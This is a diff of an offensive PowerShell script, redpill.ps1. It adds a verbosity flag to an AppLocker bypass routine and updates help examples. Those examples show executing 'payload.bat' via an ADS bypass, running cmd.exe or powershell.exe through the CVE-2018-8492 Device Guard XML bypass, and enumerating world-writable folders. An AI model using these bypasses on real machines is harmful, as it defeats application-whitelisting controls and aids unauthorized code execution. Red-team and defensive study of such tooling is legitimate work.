@@ -2123,7 +2123,7 @@ if($AppLocker -ne "false"){
        }
 
    }ElseIf($AppLocker -ieq "XmlBypass"){
-       powershell -File "$Env:TMP\AppLockerXml.ps1" -Action XmlBypass -Execute "$Execute" -TimeOpen $TimeOpen
+       powershell -File "$Env:TMP\AppLockerXml.ps1" -Action XmlBypass -Execute "$Execute" -TimeOpen $TimeOpen -Verb $Verb
    }ElseIf($AppLocker -ieq "TestBat"){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat Bypass
    }ElseIf($AppLocker -Match '(.bat)$'){
@@ -3973,7 +3973,7 @@ $HelpParameters = @"
       users to sellect diferent GroupName(s), FolderRigths Or StartDir @arguments!
 
    .Parameter Verb
-      Accepts arguments: True, False (verbose enumeration)
+      Accepts arguments: True, False (default: False)
 
    .Parameter AppLocker
       Accepts arguments: Enum, WhoAmi, TestBat, XmlBypass (default: Enum)
@@ -3994,32 +3994,36 @@ $HelpParameters = @"
       [XmlBypass] The TimeOut to maintain the application open! (default: 1 seconds)
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
+      PS C:\> .\redpill.ps1 -AppLocker WhoAmi
       Enumerate ALL Group Names available on local machine
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker TestBat
-      Test for AppLocker Batch Script Execution Restrictions
+      Test AppLocker for Batch script execution bypass (`$ADS)
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker "`$Env:TMP\applock.bat"
-      Execute applock.bat through text format applock bypass technic
+      PS C:\> .\redpill.ps1 -AppLocker "`$Env:TMP\payload.bat"
+      Execute 'payload.bat' through `$ADS text format bypass technic!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "`$PSHome\Powershell.exe"
-      Execute 'Powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass technic!
+      Execute 'Powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "cmd.exe" -TimeOpen 5
-      Execute 'cmd.exe' trougth CVE-2018-8492 XML bypass technic and close it after 5 seconds!
+      Execute 'cmd.exe' trougth CVE-2018-8492 WDG XML bypass! (close cmd after 5 sec)
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "calc.exe" -Verb True
+      Skip cmdlet vulnerability tests to execute 'calc.exe' through WDG XML bypass technic!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
-      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions on it!
+      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions active!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
-      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions on it!
+      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions active!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "`$Env:PROGRAMFILES"
